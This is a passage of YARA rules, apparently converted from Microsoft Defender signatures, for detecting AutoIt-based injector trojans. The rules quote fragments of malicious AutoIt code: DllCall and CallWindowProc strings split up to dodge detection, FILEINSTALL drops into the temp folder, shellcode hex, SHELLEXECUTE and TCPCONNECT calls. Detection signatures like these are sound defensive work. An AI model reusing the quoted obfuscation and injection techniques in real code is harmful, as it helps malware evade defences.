        $x_4_15 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 75 00 73 00 65 00 72 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 22 00 43 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 6c 00 57 00 22 00 20 00 26 00 20 00 22 00 69 00 6e 00 64 00 6f 00 77 00 50 00 22 00 20 00 26 00 20 00 22 00 72 00 6f 00 63 00 22 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 2b 00 20 00 39 00 31 00 33 00 36 00 20 00 2c 00}  //weight: 4, accuracy: Low
        $x_4_16 = {44 4c 4c 43 41 4c 4c 20 28 20 22 75 73 65 72 33 32 2e 64 6c 6c 22 20 2c 20 22 70 74 72 22 20 2c 20 22 43 61 22 20 26 20 22 6c 6c 57 22 20 26 20 22 69 6e 64 6f 77 50 22 20 26 20 22 72 6f 63 22 20 2c 20 22 70 74 72 22 20 2c 20 24 [0-20] 20 2b 20 39 31 33 36 20 2c}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_4_*) and 2 of ($x_2_*) and 10 of ($x_1_*))) or
            ((3 of ($x_4_*) and 10 of ($x_1_*))) or
            ((3 of ($x_4_*) and 1 of ($x_2_*) and 8 of ($x_1_*))) or
            ((3 of ($x_4_*) and 2 of ($x_2_*) and 6 of ($x_1_*))) or
            ((4 of ($x_4_*) and 6 of ($x_1_*))) or
            ((4 of ($x_4_*) and 1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((4 of ($x_4_*) and 2 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NBV_2147928358_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NBV!MTB"
        threat_id = "2147928358"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = "= EXECUTE ( \"Cei\" & \"lin\" & \"g(Stri\" & \"ngLen" ascii //weight: 1
        $x_1_4 = "= EXECUTE ( \"Str\" & \"ingL\" & \"eft" ascii //weight: 1
        $x_1_5 = "= EXECUTE ( \"Str\" & \"ingT\" & \"rim\" & \"Le\" & \"ft" ascii //weight: 1
        $x_1_6 = "btkqyuniuo" ascii //weight: 1
        $x_1_7 = "wqadobiril" ascii //weight: 1
        $x_1_8 = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion" ascii //weight: 1
        $x_1_9 = "Security Logs Archive\\firewall_image.jpg" ascii //weight: 1
        $x_1_10 = "Steps\\ Monitor Logs\\component_registry.data" ascii //weight: 1
        $x_1_11 = "Code Snapshots\\application_event_summary.txt" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 9 of ($x_1_*))) or
            ((2 of ($x_2_*) and 7 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_GSH_2147928371_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GSH!MTB"
        threat_id = "2147928371"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILEINSTALL ( \"nonhazardousness\" , @TEMPDIR & \"\\nonhazardousness\" , 1 )" ascii //weight: 1
        $x_1_2 = "FILEGETSIZE ( @APPDATADIR & \"\\ Data Validator\\demo_image.bmp" ascii //weight: 1
        $x_1_3 = "FILEMOVE ( @TEMPDIR & \"\\Endpoints\\activity_log.conf\" , @WORKINGDIR & \"\\Live\\Certificates\\operation_report.dat" ascii //weight: 1
        $x_1_4 = "REGDELETE ( \"HKCU\\Control Panel\\Desktop\" , \"338PQpHwjFO1XpIFQRh\" )" ascii //weight: 1
        $x_1_5 = "FILEDELETE ( @APPDATADIR & \"\\ User Access\\activity_summary.data\" )" ascii //weight: 1
        $x_1_6 = "REGDELETE ( \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\" , \"BpR18J8rSz\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AQGA_2147928538_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AQGA!MTB"
        threat_id = "2147928538"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_4_1 = "SHELLEXECUTE ( @WORKINGDIR & \"\\vxQSYfert\\qWRpviqXj.exe\" )" ascii //weight: 4
        $x_2_2 = "SHELLEXECUTE ( @WORKINGDIR & \"\\vxQSYfert\\" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NBU_2147928693_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NBU!MTB"
        threat_id = "2147928693"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = "= \"0x558bec81eccc020" ascii //weight: 1
        $x_1_4 = "ffffffba7400000066899546ffffffb" ascii //weight: 1
        $x_1_5 = "ffffba75000000668955d0b873000000668945d2b9650000006" ascii //weight: 1
        $x_1_6 = "66894d92ba2e00000066895594b86400000066894596b96c00000066894d98ba6c000000668" ascii //weight: 1
        $x_1_7 = "fffb96c00000066898d4affffffba6c0000006689954cffffffb82e0000006689854effffffb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 5 of ($x_1_*))) or
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HNH_2147928932_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNH!MTB"
        threat_id = "2147928932"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 00 20 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 56 00 45 00 52 00 53 00 45 00 20 00 28 00 20 00 22 00 74 00 69 00 6c 00 70 00 53 00 67 00 6e 00 69 00 72 00 74 00 53 00 22 00 20 00 29 00 20 00 2c 00 20 00 24 00 [0-53] 20 00 2c 00 20 00 22 00 ?? ?? 22 00 20 00 2c 00 20 00 ?? ?? 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {3d 20 43 41 4c 4c 20 28 20 53 54 52 49 4e 47 52 45 56 45 52 53 45 20 28 20 22 74 69 6c 70 53 67 6e 69 72 74 53 22 20 29 20 2c 20 24 [0-53] 20 2c 20 22 ?? ?? 22 20 2c 20 ?? ?? 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = {26 00 3d 00 20 00 43 00 48 00 52 00 57 00 20 00 28 00 20 00 24 00 [0-53] 20 00 5b 00 20 00 24 00 [0-53] 20 00 5d 00 20 00 2d 00 20 00 24 00 [0-53] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {26 3d 20 43 48 52 57 20 28 20 24 [0-53] 20 5b 20 24 [0-53] 20 5d 20 2d 20 24 [0-53] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-96] 20 00 28 00 20 00 [0-4] [0-6] ?? ?? [0-6] 03 [0-6] 03 [0-6] 03 04 03 [0-6] 03 [0-6] 03 [0-6] 03 [0-6] 03 [0-6] 03 0c 03 0c [0-4] 20 00 2c 00 20 00 [0-4] 20 00 2b 00 20 00 [0-4] 20 00 29 00 20 00 2c 00}  //weight: 1, accuracy: Low
        $x_1_6 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-96] 20 28 20 [0-4] [0-6] ?? ?? [0-6] 03 [0-6] 03 [0-6] 03 04 03 [0-6] 03 [0-6] 03 [0-6] 03 [0-6] 03 [0-6] 03 0c 03 0c [0-4] 20 2c 20 [0-4] 20 2b 20 [0-4] 20 29 20 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HNI_2147929024_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNI!MTB"
        threat_id = "2147929024"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 43 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 6c 00 41 00 22 00 20 00 26 00 20 00 22 00 64 00 64 00 72 00 65 00 22 00 20 00 26 00 20 00 22 00 73 00 73 00 28 00 22 00 22 00 69 00 6e 00 74 00 22 00 22 00 2c 00 20 00 24 00 [0-96] 20 00 2b 00 20 00 30 00 78 00 ?? ?? ?? ?? ?? ?? ?? ?? 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 43 61 22 20 26 20 22 6c 6c 41 22 20 26 20 22 64 64 72 65 22 20 26 20 22 73 73 28 22 22 69 6e 74 22 22 2c 20 24 [0-96] 20 2b 20 30 78 ?? ?? ?? ?? ?? ?? ?? ?? 29 22 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 43 00 61 00 6c 00 6c 00 28 00 [0-96] 28 00 22 00 22 00 ?? ?? ?? ?? ?? ?? 7d 00 ?? ?? 7c 00 ?? ?? 7b 00}  //weight: 2, accuracy: Low
        $x_2_4 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 43 61 6c 6c 28 [0-96] 28 22 22 ?? ?? ?? ?? ?? ?? 7d ?? ?? 7c ?? ?? 7b}  //weight: 2, accuracy: Low
        $x_2_5 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 53 00 74 00 72 00 69 00 6e 00 67 00 52 00 65 00 70 00 6c 00 61 00 63 00 65 00 28 00 24 00 [0-96] 2c 00 20 00 22 00 22 00 [0-96] 22 00 22 00 2c 00 20 00 22 00 22 00 22 00 22 00 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_6 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 53 74 72 69 6e 67 52 65 70 6c 61 63 65 28 24 [0-96] 2c 20 22 22 [0-96] 22 22 2c 20 22 22 22 22 29 22 20 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Win32_AutoitInject_NBK_2147929249_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NBK!MTB"
        threat_id = "2147929249"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "CASE ( 13 * ( ( 8 ^ 2 + -59 ) * 12 + -57 ) + -35 )" ascii //weight: 2
        $x_1_2 = "CASE ( ( 10 * 9 + -87 ) * ( 15 ^ ( 24 * 4 + -94 ) / 3 + -71 ) + -10 )" ascii //weight: 1
        $x_1_3 = "3 * 30 + -82 ) * 7 + -49 ) * 6 + -37 ) * 17 + -83 ) , D" ascii //weight: 1
        $x_1_4 = "[ ( ( ( 3 ^ 3 + -23 ) * 12 + -45 ) * 18 + -52 ) ]" ascii //weight: 1
        $x_1_5 = "[ ( 38 * ( ( ( 77 ^ 1 / 11 + -1 ) * 4 + -21 ) * 4 + -10 ) / 38 ) ]" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NBM_2147929251_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NBM!MTB"
        threat_id = "2147929251"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "( 70 * ( 20 * ( 6 ^ ( 33 * 3 + -96 ) / 36 + -3 ) + -56 ) / 20 ) , 90 )" ascii //weight: 2
        $x_1_2 = "( ( 5 * 4 + -6 ) , - ( ( 15 ^ 2 / 3 + -71 ) * 23 + -90 )" ascii //weight: 1
        $x_1_3 = "( 20 * ( 6 ^ ( 33 * 3 + -96 ) / 36 + -3 ) + -56 ) / 20 ) , 90 )" ascii //weight: 1
        $x_1_4 = "( 80 ^ ( 4 * 11 + -43 ) / 40 + 10 ) ) , 78 ) ) &" ascii //weight: 1
        $x_1_5 = "SHELLEXECUTE" ascii //weight: 1
        $x_1_6 = "TCPCONNECT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_HNJ_2147929546_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNJ!MTB"
        threat_id = "2147929546"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 00 49 00 52 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 40 00 41 00 50 00 50 00 44 00 41 00 54 00 41 00 44 00 49 00 52 00 20 00 26 00 20 00 [0-48] 20 00 28 00 20 00 22 00 [0-48] [0-48] 22 00 20 00 29 00 20 00 29 00 [0-16] 45 00 4e 00 44 00 46 00 55 00 4e 00 43 00 [0-16] 46 00 55 00 4e 00 43 00 20 00 [0-48] 20 00 28 00 20 00 29 00 [0-16] 46 00 49 00 4c 00 45 00 43 00 4f 00 50 00 59 00 20 00 28 00 20 00 40 00 41 00 55 00 54 00 4f 00 49 00 54 00 45 00 58 00 45 00 20 00 2c 00 20 00 40 00 41 00 50 00 50 00 44 00 41 00 54 00 41 00 44 00 49 00 52 00 20 00 26 00 20 00 00 20 00 28 00 20 00 22 00 01 [0-48] 22 00 20 00 29 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {44 49 52 43 52 45 41 54 45 20 28 20 40 41 50 50 44 41 54 41 44 49 52 20 26 20 [0-48] 20 28 20 22 [0-48] [0-48] 22 20 29 20 29 [0-16] 45 4e 44 46 55 4e 43 [0-16] 46 55 4e 43 20 [0-48] 20 28 20 29 [0-16] 46 49 4c 45 43 4f 50 59 20 28 20 40 41 55 54 4f 49 54 45 58 45 20 2c 20 40 41 50 50 44 41 54 41 44 49 52 20 26 20 00 20 28 20 22 01 [0-48] 22 20 29 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {3d 00 20 00 44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 [0-48] 20 00 28 00 20 00 22 00 [0-4] 7b 00 [0-4] 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-34] 20 00 29 00 20 00 26 00 20 00 22 00 5d 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {3d 20 44 4c 4c 53 54 52 55 43 54 43 52 45 41 54 45 20 28 20 [0-48] 20 28 20 22 [0-4] 7b [0-4] 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-34] 20 29 20 26 20 22 5d 22 20 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Trojan_Win32_AutoitInject_HNL_2147929665_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNL!MTB"
        threat_id = "2147929665"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 55 00 4e 00 43 00 20 00 [0-64] 20 00 28 00 20 00 29 00 [0-8] 52 00 45 00 54 00 55 00 52 00 4e 00 20 00 ?? ?? ?? ?? 01 45 00 4e 00 44 00 46 00 55 00 4e 00 43 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 55 4e 43 20 [0-64] 20 28 20 29 [0-8] 52 45 54 55 52 4e 20 ?? ?? ?? ?? 01 45 4e 44 46 55 4e 43}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 55 00 4e 00 43 00 20 00 [0-64] 20 00 28 00 20 00 29 00 [0-8] 52 00 45 00 54 00 55 00 52 00 4e 00 20 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 01 45 00 4e 00 44 00 46 00 55 00 4e 00 43 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 55 4e 43 20 [0-64] 20 28 20 29 [0-8] 52 45 54 55 52 4e 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 01 45 4e 44 46 55 4e 43}  //weight: 1, accuracy: Low
        $x_2_5 = {46 00 55 00 4e 00 43 00 20 00 [0-64] 20 00 28 00 20 00 29 00 [0-8] 52 00 45 00 54 00 55 00 52 00 4e 00 20 00 30 00 01 45 00 4e 00 44 00 46 00 55 00 4e 00 43 00}  //weight: 2, accuracy: Low
        $x_2_6 = {46 55 4e 43 20 [0-64] 20 28 20 29 [0-8] 52 45 54 55 52 4e 20 30 01 45 4e 44 46 55 4e 43}  //weight: 2, accuracy: Low
        $x_2_7 = {46 00 55 00 4e 00 43 00 20 00 [0-64] 20 00 28 00 20 00 29 00 [0-8] 47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 43 00 4f 00 4e 00 53 00 54 00 20 00 24 00 [0-64] 20 00 3d 00 20 00 [0-21] 01 45 00 4e 00 44 00 46 00 55 00 4e 00 43 00}  //weight: 2, accuracy: Low
        $x_2_8 = {46 55 4e 43 20 [0-64] 20 28 20 29 [0-8] 47 4c 4f 42 41 4c 20 43 4f 4e 53 54 20 24 [0-64] 20 3d 20 [0-21] 01 45 4e 44 46 55 4e 43}  //weight: 2, accuracy: Low
        $x_2_9 = {46 00 55 00 4e 00 43 00 20 00 [0-64] 20 00 28 00 20 00 29 00 [0-8] 47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-64] 20 00 3d 00 20 00 [0-21] 01 45 00 4e 00 44 00 46 00 55 00 4e 00 43 00}  //weight: 2, accuracy: Low
        $x_2_10 = {46 55 4e 43 20 [0-64] 20 28 20 29 [0-8] 47 4c 4f 42 41 4c 20 24 [0-64] 20 3d 20 [0-21] 01 45 4e 44 46 55 4e 43}  //weight: 2, accuracy: Low
        $x_3_11 = "DLLSTRUCTCREATE ( \"wchar[4096]\" )" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_2_*) and 3 of ($x_1_*))) or
            ((5 of ($x_2_*) and 1 of ($x_1_*))) or
            ((6 of ($x_2_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*) and 4 of ($x_1_*))) or
            ((1 of ($x_3_*) and 3 of ($x_2_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 4 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HNM_2147929812_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNM!MTB"
        threat_id = "2147929812"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-22] 20 00 3d 00 20 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-22] 20 00 28 00 20 00 22 00 48 00 7c 00 6a 00 69 00 7c 00 7c 00 6e 00 22 00 20 00 2c 00 20 00 32 00 20 00 29 00 20 00 2c 00 20 00 24 00 [0-22] 20 00 26 00 20 00 22 00 28 00 40 00 54 00 65 00 6d 00 70 00 44 00 69 00 72 00 20 00 26 00 20 00 22 00 22 00 5c 00 [0-38] 22 00 22 00 2c 00 20 00 31 00 38 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {47 4c 4f 42 41 4c 20 24 [0-22] 20 3d 20 43 41 4c 4c 20 28 20 [0-22] 20 28 20 22 48 7c 6a 69 7c 7c 6e 22 20 2c 20 32 20 29 20 2c 20 24 [0-22] 20 26 20 22 28 40 54 65 6d 70 44 69 72 20 26 20 22 22 5c [0-38] 22 22 2c 20 31 38 29 22 20 29}  //weight: 1, accuracy: Low
        $x_2_3 = "(\"\"sxw\"\", 2)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NBO_2147929897_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NBO!MTB"
        threat_id = "2147929897"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00 20 00 2d 00 20 00 4d 00 4f 00 44 00 20 00 28 00}  //weight: 2, accuracy: Low
        $x_2_2 = {26 3d 20 43 48 52 20 28 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-31] 20 2c 20 24 [0-31] 20 2c 20 31 20 29 20 29 20 2d 20 4d 4f 44 20 28}  //weight: 2, accuracy: Low
        $x_1_3 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 43 00 4f 00 4e 00 53 00 54 00 20 00 24 00 [0-47] 20 00 3d 00 20 00 [0-47] 20 00 28 00 20 00 22 00 56 00 78 00 77 00 6f 00 75 00 6f 00 5b 00 6f 00 7b 00 78 00 6e 00 71 00 74 00 22 00 20 00 2c 00 20 00 32 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {47 4c 4f 42 41 4c 20 43 4f 4e 53 54 20 24 [0-47] 20 3d 20 [0-47] 20 28 20 22 56 78 77 6f 75 6f 5b 6f 7b 78 6e 71 74 22 20 2c 20 32 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 43 00 4f 00 4e 00 53 00 54 00 20 00 24 00 [0-47] 20 00 3d 00 20 00 [0-47] 20 00 28 00 20 00 22 00 47 00 70 00 71 00 49 00 68 00 74 00 75 00 22 00 20 00 2c 00 20 00 32 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {47 4c 4f 42 41 4c 20 43 4f 4e 53 54 20 24 [0-47] 20 3d 20 [0-47] 20 28 20 22 47 70 71 49 68 74 75 22 20 2c 20 32 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = "H|ji||n" ascii //weight: 1
        $x_1_8 = "ImqkVxnx" ascii //weight: 1
        $x_1_9 = "ImqkYmjn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((7 of ($x_1_*))) or
            ((1 of ($x_2_*) and 5 of ($x_1_*))) or
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NBN_2147930168_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NBN!MTB"
        threat_id = "2147930168"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "( 3 * 33 + -96 ) * 16 + -47 ) , ( 12 * ( 3 ^ ( 10 * 9 + -87 ) + -23 ) / 48 )" ascii //weight: 2
        $x_1_2 = "( 12 * 5 + -53 ) * ( ( 25 * 3 + -70 ) * 16 + -71 ) + -59 )" ascii //weight: 1
        $x_1_3 = "( 77 ^ 1 / 11 + -1 ) * 4 + -21 ) * 4 + -10 ) / 38 ) , D )" ascii //weight: 1
        $x_1_4 = "( - ( 14 * ( 26 * 3 + -72 ) + -80 )" ascii //weight: 1
        $x_1_5 = "( 12 * ( 3 ^ ( 10 * 9 + -87 ) + -23 ) / 48 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AE_2147930743_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AE!MTB"
        threat_id = "2147930743"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " FILEEXISTS ( @APPDATADIR & \"\\Authentication\\event_archive.txt\" )" ascii //weight: 1
        $x_1_2 = " FILEFINDFIRSTFILE ( @TEMPDIR & \"\\ Command Logs\\history_log.data\" )" ascii //weight: 1
        $x_1_3 = " REGDELETE ( \"HKCU\\Control Panel\\Desktop\" , \"mMlVBY9pA5Q8TmlTP\" )" ascii //weight: 1
        $x_1_4 = " FILEFINDNEXTFILE ( @MYDOCUMENTSDIR & \"\\ Temporary Files\\resource_info.txt\" )" ascii //weight: 1
        $x_1_5 = " PING ( \"htttp://h6DYWsLj2T.io\" , 7036 , 6665 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AF_2147931060_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AF!MTB"
        threat_id = "2147931060"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
